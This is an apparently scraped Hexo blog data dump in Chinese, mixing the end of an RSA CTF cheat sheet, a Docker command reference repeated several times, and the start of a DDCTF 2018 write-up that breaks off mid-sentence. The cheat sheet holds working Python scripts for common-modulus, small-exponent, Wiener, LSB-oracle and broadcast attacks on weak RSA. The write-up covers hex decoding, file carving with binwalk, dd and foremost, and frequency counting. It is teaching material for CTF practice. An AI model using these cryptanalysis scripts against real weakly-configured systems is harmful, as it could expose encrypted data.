class=\"line\">    _, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class=\"line\">    m = pow(c1, s1, n) <span class=\"keyword\">if</span> s1 &gt; <span class=\"number\">0</span> <span class=\"keyword\">else</span> pow(gmpy2.invert(c1, n), -s1, n)</span><br><span class=\"line\">    m *= pow(c2, s2, n) <span class=\"keyword\">if</span> s2 &gt; <span class=\"number\">0</span> <span class=\"keyword\">else</span> pow(gmpy2.invert(c2, n), -s2, n)</span><br><span class=\"line\">    m %= n</span><br><span class=\"line\">    <span class=\"keyword\">return</span> m</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">[n2, n3] = map(<span class=\"keyword\">lambda</span> x: int(base64.b64decode(x).encode(<span class=\"string\">'hex'</span>), <span class=\"number\">16</span>),</span><br><span class=\"line\">               open(<span class=\"string\">'n2&amp;n3'</span>).readlines())</span><br><span class=\"line\">[n1c1, n1c2] = map(<span class=\"keyword\">lambda</span> x: int(x, <span class=\"number\">16</span>), open(<span class=\"string\">'n1.encrypted'</span>).readlines())</span><br><span class=\"line\">[msg1c1, msg2c2] = map(<span class=\"keyword\">lambda</span> x: int(x, <span class=\"number\">16</span>), open(<span class=\"string\">'ciphertext'</span>).readlines())</span><br><span class=\"line\"><span class=\"comment\"># 通过共模攻击得到n1</span></span><br><span class=\"line\">e1 = <span class=\"number\">0x1001</span></span><br><span class=\"line\">e2 = <span class=\"number\">0x101</span></span><br><span class=\"line\">n1 = common_modulus(n3, e1, e2, n1c1, n1c2)</span><br><span class=\"line\"><span class=\"comment\"># n1,n2有一个共有质因数p1</span></span><br><span class=\"line\"><span class=\"comment\"># n1 += n3  # 存在n3比n1小的可能，并且确实如此;貌似主办方中途改题，把n1改成小于n3了。</span></span><br><span class=\"line\">p1 = gmpy2.gcd(n1, n2)</span><br><span class=\"line\"><span class=\"keyword\">assert</span> (p1 != <span class=\"number\">1</span>)</span><br><span class=\"line\">p2 = n1 / p1</span><br><span class=\"line\">p3 = n2 / p1</span><br><span class=\"line\">e = <span class=\"number\">0x1001</span></span><br><span class=\"line\">d1 = gmpy2.invert(e, (p1 - <span class=\"number\">1</span>) * (p2 - <span class=\"number\">1</span>))</span><br><span class=\"line\">d2 = gmpy2.invert(e, (p1 - <span class=\"number\">1</span>) * (p3 - <span class=\"number\">1</span>))</span><br><span class=\"line\">msg1 = pow(msg1c1, d1, n1)</span><br><span class=\"line\">msg2 = pow(msg2c2, d2, n2)</span><br><span class=\"line\">msg1 = hex(msg1)[<span class=\"number\">2</span>:].decode(<span class=\"string\">'hex'</span>)</span><br><span class=\"line\">msg2 = hex(msg2)[<span class=\"number\">2</span>:].decode(<span class=\"string\">'hex'</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> msg1, msg2</span><br><span class=\"line\"><span class=\"comment\"># XA&#123;RP0I_0Itrsigi s.y</span></span><br><span class=\"line\"><span class=\"comment\"># MNCYT_55_neetnvmrap&#125;</span></span><br><span class=\"line\"><span class=\"comment\"># XMAN&#123;CRYPT0_I5_50_Interestingvim rsa.py&#125;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"小明文攻击\"><a href=\"#小明文攻击\" class=\"headerlink\" title=\"小明文攻击\"></a>小明文攻击</h2><p>适用情况：e较小，一般为3。</p>\n<p>公钥e很小，明文m也不大的话，于是m^e=k*n+m 中的的k值很小甚至为0，爆破k或直接开三次方即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">small_msg</span><span class=\"params\">(e, n, c)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">print</span> time.asctime(), <span class=\"string\">\"Let's waiting...\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> xrange(<span class=\"number\">200000000</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> gmpy2.iroot(c + n * k, e)[<span class=\"number\">1</span>] == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">print</span> time.asctime(), <span class=\"string\">\"...done!\"</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> gmpy2.iroot(c + n * k, <span class=\"number\">3</span>)[<span class=\"number\">0</span>]</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> gmpy2,binascii,libnum,time</span><br><span class=\"line\">n=<span class=\"number\">0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929</span></span><br><span class=\"line\">e=<span class=\"number\">3</span></span><br><span class=\"line\">res=<span class=\"number\">0</span></span><br><span class=\"line\">c=int(open(<span class=\"string\">'extremelyhardRSA.rar/flag.enc'</span>,<span class=\"string\">'rb'</span>).read().encode(<span class=\"string\">'hex'</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> time.asctime()</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">200000000</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> gmpy2.iroot(c+n*i,<span class=\"number\">3</span>)[<span class=\"number\">1</span>]==<span class=\"number\">1</span>:</span><br><span class=\"line\">        res=gmpy2.iroot(c+n*i,<span class=\"number\">3</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">        <span class=\"keyword\">print</span> i,res</span><br><span class=\"line\">        <span class=\"keyword\">print</span> libnum.n2s(res)</span><br><span class=\"line\">        <span class=\"keyword\">print</span> time.asctime()</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Rabin加密中的N可被分解\"><a href=\"#Rabin加密中的N可被分解\" class=\"headerlink\" title=\"Rabin加密中的N可被分解\"></a>Rabin加密中的N可被分解</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def rabin_decrypt(c, p, q, e=2):</span><br><span class=\"line\">    n = p * q</span><br><span class=\"line\">    mp = pow(c, (p + 1) / 4, p)</span><br><span class=\"line\">    mq = pow(c, (q + 1) / 4, q)</span><br><span class=\"line\">    yp = gmpy2.invert(p, q)</span><br><span class=\"line\">    yq = gmpy2.invert(q, p)</span><br><span class=\"line\">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class=\"line\">    rr = n - r</span><br><span class=\"line\">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class=\"line\">    ss = n - s</span><br><span class=\"line\">    return (r, rr, s, ss)</span><br></pre></td></tr></table></figure>\n<h2 id=\"Wiener’s-Attack-低解密指数攻击\"><a href=\"#Wiener’s-Attack-低解密指数攻击\" class=\"headerlink\" title=\"Wiener’s Attack(低解密指数攻击 )\"></a>Wiener’s Attack(低解密指数攻击 )</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.PublicKey <span class=\"keyword\">import</span> RSA</span><br><span class=\"line\"><span class=\"keyword\">import</span> ContinuedFractions, Arithmetic</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wiener_hack</span><span class=\"params\">(e, n)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !</span></span><br><span class=\"line\">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class=\"line\">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (k, d) <span class=\"keyword\">in</span> convergents:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> k != <span class=\"number\">0</span> <span class=\"keyword\">and</span> (e * d - <span class=\"number\">1</span>) % k == <span class=\"number\">0</span>:</span><br><span class=\"line\">            phi = (e * d - <span class=\"number\">1</span>) // k</span><br><span class=\"line\">            s = n - phi + <span class=\"number\">1</span></span><br><span class=\"line\">            discr = s * s - <span class=\"number\">4</span> * n</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (discr &gt;= <span class=\"number\">0</span>):</span><br><span class=\"line\">                t = Arithmetic.is_perfect_square(discr)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> t != <span class=\"number\">-1</span> <span class=\"keyword\">and</span> (s + t) % <span class=\"number\">2</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">                    print(<span class=\"string\">\"Hacked!\"</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> d</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">False</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"私钥文件修复\"><a href=\"#私钥文件修复\" class=\"headerlink\" title=\"私钥文件修复\"></a>私钥文件修复</h2><h2 id=\"LSB-Oracle-Attack\"><a href=\"#LSB-Oracle-Attack\" class=\"headerlink\" title=\"LSB Oracle Attack\"></a>LSB Oracle Attack</h2><p>适用情况：可以选择密文并泄露最低位。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> decimal</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">oracle</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> lsb == <span class=\"string\">'odd'</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">partial</span><span class=\"params\">(c, e, n)</span>:</span></span><br><span class=\"line\">    k = n.bit_length()</span><br><span class=\"line\">    decimal.getcontext().prec = k  <span class=\"comment\"># for 'precise enough' floats</span></span><br><span class=\"line\">    lo = decimal.Decimal(<span class=\"number\">0</span>)</span><br><span class=\"line\">    hi = decimal.Decimal(n)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(k):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> oracle(c):</span><br><span class=\"line\">            hi = (lo + hi) / <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            lo = (lo + hi) / <span class=\"number\">2</span></span><br><span class=\"line\">        c = (c * pow(<span class=\"number\">2</span>, e, n)) % n</span><br><span class=\"line\">        <span class=\"comment\"># print i, int(hi - lo)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> int(hi)</span><br></pre></td></tr></table></figure>\n<h2 id=\"选择密文攻击\"><a href=\"#选择密文攻击\" class=\"headerlink\" title=\"选择密文攻击\"></a>选择密文攻击</h2><p>选择密文攻击<br>适用情况：可以构造任意密文并获得对应明文。</p>\n<p>这个好理解，在一个RSA加密过程中，明文为m，密文为c，模数为n，加密指数为e，选取x以满足<code>gcd(x,n)==1</code> 从而使x模n的逆存在，构造密文 <code>c&#39;=c*(x^e)</code>使解密后明文为 <code>m&#39;=(m*x)%n</code> ，则<code>m=m&#39;*x^-1(mod n)</code> 。可参看模意义下的运算法则部分 。</p>\n<h2 id=\"广播攻击\"><a href=\"#广播攻击\" class=\"headerlink\" title=\"广播攻击\"></a>广播攻击</h2><p>适用情况：模数n、密文c不同，明文m、加密指数e相同。一般会是e=k，然后给k组数据</p>\n<p>使用不同的模数n，相同的公钥指数e加密相同的信息。就会得到多个<code>(m^e) ==ci (mod ni)</code>，将(m^e)视为一个整体M，这就是典型的中国剩余定理适用情况。按照本文的中国剩余定理小节容易求得m^e的值，当e较小时直接开e方即可，可使用<code>gmpy2.iroot(M,e)</code> 方法。</p>\n<p>案例:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">CRT</span><span class=\"params\">(mi, ai)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class=\"line\">    <span class=\"comment\"># Chinese Remainder Theorem</span></span><br><span class=\"line\">    <span class=\"comment\"># lcm=lambda x , y:x*y/gcd(x,y)</span></span><br><span class=\"line\">    <span class=\"comment\"># mul=lambda x , y:x*y</span></span><br><span class=\"line\">    <span class=\"comment\"># assert(reduce(mul,mi)==reduce(lcm,mi))</span></span><br><span class=\"line\">    <span class=\"comment\"># 以上可用于保证mi两两互质</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (isinstance(mi, list) <span class=\"keyword\">and</span> isinstance(ai, list))</span><br><span class=\"line\">    M = reduce(<span class=\"keyword\">lambda</span> x, y: x * y, mi)</span><br><span class=\"line\">    ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) <span class=\"keyword\">for</span> (m, a) <span class=\"keyword\">in</span> zip(mi, ai)]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> reduce(<span class=\"keyword\">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class=\"line\"></span><br><span class=\"line\">m = random.randint(<span class=\"number\">0x100000000000</span>, <span class=\"number\">0xffffffffffff</span>)</span><br><span class=\"line\">e = <span class=\"number\">3</span></span><br><span class=\"line\">n1 = <span class=\"number\">0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555L</span></span><br><span class=\"line\">n2 = <span class=\"number\">0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867L</span></span><br><span class=\"line\">n3 = <span class=\"number\">0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303L</span></span><br><span class=\"line\">c1 = pow(m, e, n1)</span><br><span class=\"line\">c2 = pow(m, e, n2)</span><br><span class=\"line\">c3 = pow(m, e, n3)</span><br><span class=\"line\"><span class=\"keyword\">print</span> m == gmpy2.iroot(CRT([n1, n2, n3], [c1, c2, c3]), e)[<span class=\"number\">0</span>]</span><br></pre></td></tr></table></figure>\n"},{"title":"docker使用手册","date":"2018-05-29T06:36:55.000Z","_content":"\n## Docker命令\n\n1. 列出所有镜像\n\n   > docker images -a\n\n2. 构建镜像\n\n   >  docker build -t \\[镜像名称\\]        \\[Dockerfile所在目录\\]\n\n3. 运行镜像\n\n   > docker run --name [容器名称(可选)] -d -p 80:8080 [镜像名称]\n\n4. 查看镜像状态\n\n   > docker stats\n   >\n\n5. 显示所有的容器，包括未运行的\n\n   > docker ps -a\n\n6. 显示所有容器ID\n\n   > docker ps -a -q\n\n7. 停止运行\n\n   > docker stop [容器名称]\n\n8. 删除容器\n\n   > docker rm [容器名称]\n   >\n   > docker rm [容器ID]\n\n9. 创建一个守护态的Docker容器，然后使用docker attach命令进入该容器。\n\n   >  sudo docker run -itd ubuntu:14.04 /bin/bash \n\n10. 进入容器,这方法不怎么好\n\n  >  sudo docker attach [容器id]\n\n11. 进入容器\n\n    > docker exec -it [容器id|容器名称] /bin/bash\n\n12. 删除image\n\n    > docker rmi [ImageID]\n\n13. 查看端口开启情况\n\n    > docker port [容器名称]\n\n14. 从容器中复制文件\n\n    > docker cp [容器名称]:[path\\]             \\[主机path\\]\n\n15. 从主机复制文件到容器\n\n    > docker cp [主机path]                            \\[容器名称\\]:[path]\n","source":"_posts/docker使用手册.md","raw":"---\ntitle: docker使用手册\ndate: 2018-05-29 14:36:55\ntags: 工具手册\n---\n\n## Docker命令\n\n1. 列出所有镜像\n\n   > docker images -a\n\n2. 构建镜像\n\n   >  docker build -t \\[镜像名称\\]        \\[Dockerfile所在目录\\]\n\n3. 运行镜像\n\n   > docker run --name [容器名称(可选)] -d -p 80:8080 [镜像名称]\n\n4. 查看镜像状态\n\n   > docker stats\n   >\n\n5. 显示所有的容器，包括未运行的\n\n   > docker ps -a\n\n6. 显示所有容器ID\n\n   > docker ps -a -q\n\n7. 停止运行\n\n   > docker stop [容器名称]\n\n8. 删除容器\n\n   > docker rm [容器名称]\n   >\n   > docker rm [容器ID]\n\n9. 创建一个守护态的Docker容器，然后使用docker attach命令进入该容器。\n\n   >  sudo docker run -itd ubuntu:14.04 /bin/bash \n\n10. 进入容器,这方法不怎么好\n\n  >  sudo docker attach [容器id]\n\n11. 进入容器\n\n    > docker exec -it [容器id|容器名称] /bin/bash\n\n12. 删除image\n\n    > docker rmi [ImageID]\n\n13. 查看端口开启情况\n\n    > docker port [容器名称]\n\n14. 从容器中复制文件\n\n    > docker cp [容器名称]:[path\\]             \\[主机path\\]\n\n15. 从主机复制文件到容器\n\n    > docker cp [主机path]                            \\[容器名称\\]:[path]\n","slug":"docker使用手册","published":1,"updated":"2018-06-25T12:00:14.730Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12gs0008qkdlbpulmglf","content":"<h2 id=\"Docker命令\"><a href=\"#Docker命令\" class=\"headerlink\" title=\"Docker命令\"></a>Docker命令</h2><ol>\n<li><p>列出所有镜像</p>\n<blockquote>\n<p>docker images -a</p>\n</blockquote>\n</li>\n<li><p>构建镜像</p>\n<blockquote>\n<p> docker build -t [镜像名称]        [Dockerfile所在目录]</p>\n</blockquote>\n</li>\n<li><p>运行镜像</p>\n<blockquote>\n<p>docker run –name [容器名称(可选)] -d -p 80:8080 [镜像名称]</p>\n</blockquote>\n</li>\n<li><p>查看镜像状态</p>\n<blockquote>\n<p>docker stats</p>\n</blockquote>\n</li>\n<li><p>显示所有的容器，包括未运行的</p>\n<blockquote>\n<p>docker ps -a</p>\n</blockquote>\n</li>\n<li><p>显示所有容器ID</p>\n<blockquote>\n<p>docker ps -a -q</p>\n</blockquote>\n</li>\n<li><p>停止运行</p>\n<blockquote>\n<p>docker stop [容器名称]</p>\n</blockquote>\n</li>\n<li><p>删除容器</p>\n<blockquote>\n<p>docker rm [容器名称]</p>\n<p>docker rm [容器ID]</p>\n</blockquote>\n</li>\n<li><p>创建一个守护态的Docker容器，然后使用docker attach命令进入该容器。</p>\n<blockquote>\n<p> sudo docker run -itd ubuntu:14.04 /bin/bash </p>\n</blockquote>\n</li>\n<li><p>进入容器,这方法不怎么好</p>\n<blockquote>\n<p> sudo docker attach [容器id]</p>\n</blockquote>\n</li>\n<li><p>进入容器</p>\n<blockquote>\n<p>docker exec -it [容器id|容器名称] /bin/bash</p>\n</blockquote>\n</li>\n<li><p>删除image</p>\n<blockquote>\n<p>docker rmi [ImageID]</p>\n</blockquote>\n</li>\n<li><p>查看端口开启情况</p>\n<blockquote>\n<p>docker port [容器名称]</p>\n</blockquote>\n</li>\n<li><p>从容器中复制文件</p>\n<blockquote>\n<p>docker cp [容器名称]:[path]             [主机path]</p>\n</blockquote>\n</li>\n<li><p>从主机复制文件到容器</p>\n<blockquote>\n<p>docker cp [主机path]                            [容器名称]:[path]</p>\n</blockquote>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Docker命令\"><a href=\"#Docker命令\" class=\"headerlink\" title=\"Docker命令\"></a>Docker命令</h2><ol>\n<li><p>列出所有镜像</p>\n<blockquote>\n<p>docker images -a</p>\n</blockquote>\n</li>\n<li><p>构建镜像</p>\n<blockquote>\n<p> docker build -t [镜像名称]        [Dockerfile所在目录]</p>\n</blockquote>\n</li>\n<li><p>运行镜像</p>\n<blockquote>\n<p>docker run –name [容器名称(可选)] -d -p 80:8080 [镜像名称]</p>\n</blockquote>\n</li>\n<li><p>查看镜像状态</p>\n<blockquote>\n<p>docker stats</p>\n</blockquote>\n</li>\n<li><p>显示所有的容器，包括未运行的</p>\n<blockquote>\n<p>docker ps -a</p>\n</blockquote>\n</li>\n<li><p>显示所有容器ID</p>\n<blockquote>\n<p>docker ps -a -q</p>\n</blockquote>\n</li>\n<li><p>停止运行</p>\n<blockquote>\n<p>docker stop [容器名称]</p>\n</blockquote>\n</li>\n<li><p>删除容器</p>\n<blockquote>\n<p>docker rm [容器名称]</p>\n<p>docker rm [容器ID]</p>\n</blockquote>\n</li>\n<li><p>创建一个守护态的Docker容器，然后使用docker attach命令进入该容器。</p>\n<blockquote>\n<p> sudo docker run -itd ubuntu:14.04 /bin/bash </p>\n</blockquote>\n</li>\n<li><p>进入容器,这方法不怎么好</p>\n<blockquote>\n<p> sudo docker attach [容器id]</p>\n</blockquote>\n</li>\n<li><p>进入容器</p>\n<blockquote>\n<p>docker exec -it [容器id|容器名称] /bin/bash</p>\n</blockquote>\n</li>\n<li><p>删除image</p>\n<blockquote>\n<p>docker rmi [ImageID]</p>\n</blockquote>\n</li>\n<li><p>查看端口开启情况</p>\n<blockquote>\n<p>docker port [容器名称]</p>\n</blockquote>\n</li>\n<li><p>从容器中复制文件</p>\n<blockquote>\n<p>docker cp [容器名称]:[path]             [主机path]</p>\n</blockquote>\n</li>\n<li><p>从主机复制文件到容器</p>\n<blockquote>\n<p>docker cp [主机path]                            [容器名称]:[path]</p>\n</blockquote>\n</li>\n</ol>\n"},{"title":"ddctf2018","date":"2018-04-20T06:45:40.000Z","_content":"# 签到题目:\n复制，粘贴\n\n# (╯°□°）╯︵ ┻━┻\n题目给了一个字符串\n```\nd4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1b2e2e5e2b5b4e4b8b7e6e1e1b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd\n```\n\n首先，应该想到两两一组，一组代表一个字符，考虑到DDCTF，\"DD\"两个字符，在字符串中找到两组相邻的字符串，找到了\"c4c4\"和\"e1e1\"：\n\nd4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0<b>c4c4</b>c3d4c6fbb9e1b2e2e5e2b5b4e4b8b  7e6<b>e1e1</b>b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd\n\n进一步分析可知，<b>c4</b>和<b>c3</b>刚好相差1，而<b>D</b>和<b>C</b>的ascii值也相差1，<b>c4c4</b>应该就表示\"DD\", 然后以此类推：\n\n![avatar](/assets/ddctf/20180420150038.png)\n\n# 第四扩展FS\n1. 下载下来是一张图片\n\n首先: `binwalk windows.jpg`\n\n```\nsecurity:/mnt/c/Users/HT/Desktop/ddctf$ binwalk windows.jpg\n\nDECIMAL         HEX             DESCRIPTION\n-------------------------------------------------------------------------------------------------------\n30              0x1E            TIFF image data, big-endian\n2871992         0x2BD2B8        LZMA compressed data, properties: 0x01, dictionary size: 2097152 bytes, uncompressed size: 134217728 bytes\n7236510         0x6E6B9E        Zip archive data, at least v2.0 to extract, compressed size: 20430, uncompressed size: 33350, name: \"file.txt\"\n7257054         0x6EBBDE        End of Zip archive\n\nProgress: 81.81% (10890274 / 13310878)\n```\n可以看到图片里边有个压缩包。\n这时候，可以使用`dd`或者`foremost`命令，来分离压缩包。\n\n> dd if=windows.jpg of=temp.zip skip=7236510 count=20544 bs=1  \n> foremost windows.jpg\n\n得到一个压缩包，然后，查看图片属性，会在详细信息->备注里看到一个字符串\"Pactera\"，估计就是密码。\n\n2. 然后打开file.txt\n\n![avatar](/assets/ddctf/20180420151247.png)  \n可以看到有很多乱序字符，结合题目的提示，<b>日常违规审计中频次有时候非常重要</b>,可以统计一下每个字符串的个数，并排序。\n\n```\ngrep -o . file.txt | sort |uniq -c | sort -rn\n```\n\n![avatar](/assets/ddctf/20180420151941.png)\n\n然后从新组合一下，就得到flag了。\n\n```\nDDCTF{ZuozHengqU3dEshi}\n```\n<!--more-->\n\n# 流量分析\n这道题，花了我很长时间，直到ddctf快结束，才做出来，可以说完全被Fl-g.zip和sqlmap.zip绕进去了，气的我都想打我自己。  \n过程如下:\n首先大体上浏览整个数据包，会发现，大体上就是3个部分:  \n\n+  ftp 发送了两个zip,Fl-g.zip和sqlmap.zip,传了一大堆数据  \n+  邮件相关的数据包\n+  https相关的包，由于只有几个，竟然被我选择性忽略了。\n\n## ftp之Fl-g.zxip\n> tcp.stream eq 2004   \n\n右键follow tcp流，保存数据，发现只有119kb，解压也提示包损坏，要密码，最终也没啥结果。\n\n然后，感觉应该是follow tcp流，没有得到所有的数据，于是，使用:\n> tcp.stream eq 2004 && 